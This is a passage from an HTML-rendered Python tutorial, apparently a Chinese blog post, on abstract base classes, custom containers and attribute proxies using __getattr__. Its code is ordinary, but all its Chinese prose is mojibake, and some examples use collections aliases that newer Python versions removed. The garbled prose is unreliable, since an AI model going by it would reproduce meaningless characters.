class="line"></span><br><span class="line">        <span class="keyword">if</span> kwargs:</span><br><span class="line">            <span class="keyword">raise</span> TypeError(<span class="string">'Duplicate values for &#123;&#125;'</span>.format(<span class="string">','</span>.join(kwargs)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Stock</span><span class="params">(Structure3)</span>:</span></span><br><span class="line">        _fields = [<span class="string">'name'</span>, <span class="string">'shares'</span>, <span class="string">'price'</span>]</span><br><span class="line"></span><br><span class="line">    s1 = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>)</span><br><span class="line">    s2 = Stock(<span class="string">'ACME'</span>, <span class="number">50</span>, <span class="number">91.1</span>, date=<span class="string">'8/2/2012'</span>)</span><br></pre></td></tr></table></figure><h4 id="å®šä¹‰æ¥å£æˆ–è€…æŠ½è±¡åŸºç±»"><a href="#å®šä¹‰æ¥å£æˆ–è€…æŠ½è±¡åŸºç±»" class="headerlink" title="å®šä¹‰æ¥å£æˆ–è€…æŠ½è±¡åŸºç±»"></a>å®šä¹‰æ¥å£æˆ–è€…æŠ½è±¡åŸºç±»</h4><p>ä½¿ç”¨<code>abc</code>æ¨¡å—å¯ä»¥å¾ˆè½»æ¾çš„å®šä¹‰æŠ½è±¡åŸºç±»ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABCMeta, abstractmethod</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IStream</span><span class="params">(metaclass=ABCMeta)</span>:</span></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self, maxbytes=<span class="number">-1</span>)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @abstractmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>æŠ½è±¡ç±»çš„ä¸€ä¸ªç‰¹ç‚¹æ˜¯å®ƒä¸èƒ½ç›´æ¥è¢«å®ä¾‹åŒ–ï¼Œå¦‚ä¸‹æ–¹å¼æ˜¯é”™è¯¯çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a = IStream()</span><br></pre></td></tr></table></figure><p>æŠ½è±¡ç±»çš„ç›®çš„å°±æ˜¯è®©åˆ«çš„ç±»ç»§æ‰¿å®ƒå¹¶å®ç°ç‰¹å®šçš„æŠ½è±¡æ–¹æ³•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SocketStream</span><span class="params">(IStream)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(self, maxbytes=<span class="number">-1</span>)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(self, data)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>æŠ½è±¡åŸºç±»çš„ä¸€ä¸ªä¸»è¦ç”¨é€”æ˜¯åœ¨ä»£ç ä¸­æ£€æŸ¥æŸäº›ç±»æ˜¯å¦ä¸ºç‰¹å®šç±»å‹ï¼Œå®ç°äº†ç‰¹å®šæ¥å£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(obj, stream)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> isinstance(stream, IStream):</span><br><span class="line">        <span class="keyword">raise</span> TypeError(<span class="string">'Expected an IStream'</span>)</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h4 id="å®ç°è‡ªå®šä¹‰å®¹å™¨"><a href="#å®ç°è‡ªå®šä¹‰å®¹å™¨" class="headerlink" title="å®ç°è‡ªå®šä¹‰å®¹å™¨"></a>å®ç°è‡ªå®šä¹‰å®¹å™¨</h4><p><code>collections</code>å®šä¹‰äº†å¾ˆå¤šæŠ½è±¡åŸºç±»ï¼Œå½“ä½ æƒ³è‡ªå®šä¹‰å®¹å™¨ç±»çš„æ—¶å€™å®ƒä»¬ä¼šéå¸¸æœ‰ç”¨ã€‚ æ¯”å¦‚ä½ æƒ³è®©ä½ çš„ç±»æ”¯æŒè¿­ä»£ï¼Œé‚£å°±è®©ä½ çš„ç±»ç»§æ‰¿<code>collections.Iterable</code>å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(collections.Iterable)</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>ä¸è¿‡éœ€è¦å®ç°<code>collections.Iterable</code>æ‰€æœ‰çš„æŠ½è±¡æ–¹æ³•ï¼Œå¦åˆ™ä¼šæŠ¥é”™:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = A()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: Can<span class="string">'t instantiate abstract class A with abstract methods __iter__</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections.abc <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span><span class="params">(Iterable)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">a = A()</span><br></pre></td></tr></table></figure><p><code>collections</code>ä¸­å¾ˆå¤šæŠ½è±¡ç±»ä¼šä¸ºä¸€äº›å¸¸è§å®¹å™¨æ“ä½œæä¾›é»˜è®¤çš„å®ç°ï¼Œè¿™æ ·ä¸€æ¥ä½ åªéœ€è¦å®ç°é‚£äº›ä½ æœ€æ„Ÿå…´è¶£çš„æ–¹æ³•å³å¯ã€‚å‡è®¾ä½ çš„ç±»ç»§æ‰¿è‡ª<code>collections.MutableSequence</code>ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Items</span><span class="params">(collections.MutableSequence)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, initial=None)</span>:</span></span><br><span class="line">        self._items = list(initial) <span class="keyword">if</span> initial <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">else</span> []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        print(<span class="string">'Getting:'</span>, index)</span><br><span class="line">        <span class="keyword">return</span> self._items[index]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span><span class="params">(self, index, value)</span>:</span></span><br><span class="line">        print(<span class="string">'Setting:'</span>, index, value)</span><br><span class="line">        self._items[index] = value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delitem__</span><span class="params">(self, index)</span>:</span></span><br><span class="line">        print(<span class="string">'Deleting:'</span>, index)</span><br><span class="line">        <span class="keyword">del</span> self._items[index]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">insert</span><span class="params">(self, index, value)</span>:</span></span><br><span class="line">        print(<span class="string">'Inserting:'</span>, index, value)</span><br><span class="line">        self._items.insert(index, value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__len__</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Len'</span>)</span><br><span class="line">        <span class="keyword">return</span> len(self._items)</span><br></pre></td></tr></table></figure><p>å¦‚æœä½ åˆ›å»º<code>Items</code>çš„å®ä¾‹ï¼Œä½ ä¼šå‘ç°å®ƒæ”¯æŒå‡ ä¹æ‰€æœ‰çš„æ ¸å¿ƒåˆ—è¡¨æ–¹æ³•(å¦‚<code>append()ã€remove()ã€count()</code>ç­‰)ã€‚ ä½¿ç”¨ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = Items([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(a)</span><br><span class="line">Len</span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(<span class="number">4</span>)</span><br><span class="line">Len</span><br><span class="line">Inserting: <span class="number">3</span> <span class="number">4</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(<span class="number">2</span>)</span><br><span class="line">Len</span><br><span class="line">Inserting: <span class="number">4</span> <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.count(<span class="number">2</span>)</span><br><span class="line">Getting: <span class="number">0</span></span><br><span class="line">Getting: <span class="number">1</span></span><br><span class="line">Getting: <span class="number">2</span></span><br><span class="line">Getting: <span class="number">3</span></span><br><span class="line">Getting: <span class="number">4</span></span><br><span class="line">Getting: <span class="number">5</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.remove(<span class="number">3</span>)</span><br><span class="line">Getting: <span class="number">0</span></span><br><span class="line">Getting: <span class="number">1</span></span><br><span class="line">Getting: <span class="number">2</span></span><br><span class="line">Deleting: <span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h4 id="å±æ€§çš„ä»£ç†è®¿é—®"><a href="#å±æ€§çš„ä»£ç†è®¿é—®" class="headerlink" title="å±æ€§çš„ä»£ç†è®¿é—®"></a>å±æ€§çš„ä»£ç†è®¿é—®</h4><p>ç®€å•æ¥è¯´ï¼Œä»£ç†æ˜¯ä¸€ç§ç¼–ç¨‹æ¨¡å¼ï¼Œå®ƒå°†æŸä¸ªæ“ä½œè½¬ç§»ç»™å¦å¤–ä¸€ä¸ªå¯¹è±¡æ¥å®ç°ã€‚ æœ€ç®€å•çš„å½¢å¼å¯èƒ½æ˜¯åƒä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B1</span>:</span></span><br><span class="line">    <span class="string">"""ç®€å•çš„ä»£ç†"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._a = A()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._a.spam(x)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._a.foo()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>å¦‚æœæœ‰å¤§é‡çš„æ–¹æ³•éœ€è¦ä»£ç†ï¼Œ é‚£ä¹ˆä½¿ç”¨<code>__getattr__()</code>æ–¹æ³•ä¼šæ›´å¥½ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B2</span>:</span></span><br><span class="line">    <span class="string">"""ä½¿ç”¨__getattr__çš„ä»£ç†ï¼Œä»£ç†æ–¹æ³•æ¯”è¾ƒå¤šæ—¶å€™"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._a = A()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="string">"""è¿™ä¸ªæ–¹æ³•åœ¨è®¿é—®çš„attributeä¸å­˜åœ¨çš„æ—¶å€™è¢«è°ƒç”¨"""</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._a, name)</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b = B2()</span><br><span class="line">b.bar()  <span class="comment"># è°ƒç”¨B.bar() (B2ä¸Šå­˜åœ¨)</span></span><br><span class="line">b.spam(<span class="number">42</span>)  <span class="comment"># è°ƒç”¨B.__getattr__('spam')ä»£ç†åˆ°A.spam</span></span><br></pre></td></tr></table></figure><p>å¦å¤–ä¸€ä¸ªä»£ç†ä¾‹å­æ˜¯å®ç°ä»£ç†æ¨¡å¼ï¼Œç¤ºä¾‹å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Proxy</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, obj)</span>:</span></span><br><span class="line">        self._obj = obj</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        print(<span class="string">'getattr:'</span>, name)</span><br><span class="line">        <span class="keyword">return</span> getattr(self._obj, name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">'_'</span>):</span><br><span class="line">            super().__setattr__(name, value)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'setattr:'</span>, name, value)</span><br><span class="line">            setattr(self._obj, name, value)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> name.startswith(<span class="string">'_'</span>):</span><br><span class="line">            super().__delattr__(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'delattr:'</span>, name)</span><br><span class="line">            delattr(self._obj, name)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨è¿™ä¸ªä»£ç†ç±»æ—¶ï¼Œä½ åªéœ€è¦ç”¨å®ƒæ¥åŒ…è£…ä¸‹å…¶ä»–ç±»å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Spam</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        self.x = x</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self, y)</span>:</span></span><br><span class="line">        print(<span class="string">'Spam.bar:'</span>, self.x, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create an instance</span></span><br><span class="line">s = Spam(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># Create a proxy around it</span></span><br><span class="line">p = Proxy(s)</span><br><span class="line"><span class="comment"># Access the proxy</span></span><br><span class="line">print(p.x)  <span class="comment"># Outputs 2</span></span><br><span class="line">p.bar(<span class="number">3</span>)  <span class="comment"># Outputs "Spam.bar: 2 3"</span></span><br><span class="line">p.x = <span class="number">37</span>  <span class="comment"># Changes s.x to 37</span></span><br></pre></td></tr></table></figure><p>é€šè¿‡è‡ªå®šä¹‰å±æ€§è®¿é—®æ–¹æ³•ï¼Œä½ å¯ä»¥ç”¨ä¸åŒæ–¹å¼è‡ªå®šä¹‰ä»£ç†ç±»è¡Œä¸ºã€‚</p><p>ä»£ç†ç±»æœ‰æ—¶å€™å¯ä»¥ä½œä¸ºç»§æ‰¿çš„æ›¿ä»£æ–¹æ¡ˆã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªç®€å•çš„ç»§æ‰¿å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(<span class="string">'A.spam'</span>, x)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'A.foo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span><span class="params">(A)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(<span class="string">'B.spam'</span>)</span><br><span class="line">        super().spam(x)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'B.bar'</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ä»£ç†çš„è¯ï¼Œå°±æ˜¯ä¸‹é¢è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(<span class="string">'A.spam'</span>, x)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'A.foo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._a = A()</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">spam</span><span class="params">(self, x)</span>:</span></span><br><span class="line">        print(<span class="string">'B.spam'</span>, x)</span><br><span class="line">        self._a.spam(x)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">bar</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'B.bar'</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._a, name)</span><br></pre></td></tr></table></figure><p>å½“å®ç°ä»£ç†æ¨¡å¼æ—¶ï¼Œè¿˜æœ‰äº›ç»†èŠ‚éœ€è¦æ³¨æ„ã€‚é¦–å…ˆï¼Œ<code>__getattr__()</code>å®é™…æ˜¯ä¸€ä¸ªåå¤‡æ–¹æ³•ï¼Œåªæœ‰åœ¨å±æ€§ä¸å­˜åœ¨æ—¶æ‰ä¼šè°ƒç”¨ã€‚å› æ­¤ï¼Œå¦‚æœä»£ç†ç±»å®ä¾‹æœ¬èº«æœ‰è¿™ä¸ªå±æ€§çš„è¯ï¼Œé‚£ä¹ˆä¸ä¼šè§¦å‘è¿™ä¸ªæ–¹æ³•çš„ã€‚å¦å¤–ï¼Œ<code>__setattr__()</code>å’Œ<code>__delattr__()</code>éœ€è¦é¢å¤–çš„é­”æ³•æ¥åŒºåˆ†ä»£ç†å®ä¾‹å’Œè¢«ä»£ç†å®ä¾‹<code>_obj</code>çš„å±æ€§ã€‚ä¸€ä¸ªé€šå¸¸çš„çº¦å®šæ˜¯åªä»£ç†é‚£äº›ä¸ä»¥ä¸‹åˆ’çº¿<code>_</code>å¼€å¤´çš„å±æ€§ã€‚</p><p>è¿˜æœ‰ä¸€ç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>__getattr__()</code>å¯¹äºå¤§éƒ¨åˆ†ä»¥åŒä¸‹åˆ’çº¿(<code>__</code>)å¼€å§‹å’Œç»“å°¾çš„å±æ€§å¹¶ä¸é€‚ç”¨ã€‚ ä¾‹å¦‚è€ƒè™‘å¦‚ä¸‹çš„ç±»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListLike</span>:</span></span><br><span class="line">    <span class="string">"""__getattr__å¯¹äºåŒä¸‹åˆ’çº¿å¼€å§‹å’Œç»“å°¾çš„æ–¹æ³•æ˜¯ä¸èƒ½ç”¨çš„ï¼Œéœ€è¦ä¸€ä¸ªä¸ªå»é‡å®šä¹‰"""</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self._items = []</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__getattr__</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> getattr(self._items, name)</span><br></pre></td></tr></table></figure><p>å¦‚æœæ˜¯åˆ›å»ºä¸€ä¸ª<code>ListLike</code>å¯¹è±¡ï¼Œä¼šå‘ç°å®ƒæ”¯æŒæ™®é€šçš„åˆ—è¡¨æ–¹æ³•ï¼Œå¦‚<code>append()</code>å’Œ<code>insert()</code>ï¼Œ ä½†æ˜¯å´ä¸æ”¯æŒ<code>len()</code>ã€å…ƒç´ æŸ¥æ‰¾ç­‰ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = ListLike()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.append(<span class="number">2</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.insert(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a.sort()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(a)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: object of type <span class="string">'ListLike'</span> has no len()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a[<span class="number">0</span>]</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">    File <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: <span class="string">'ListLike'</span> object does <span class="keyword">not</span> support indexing</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†è®©å®ƒæ”¯æŒè¿™äº›æ–¹æ³•ï¼Œå¿…é¡»æ‰‹åŠ¨å®ç°è¿™äº›æ–¹æ³•ä»£ç†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td 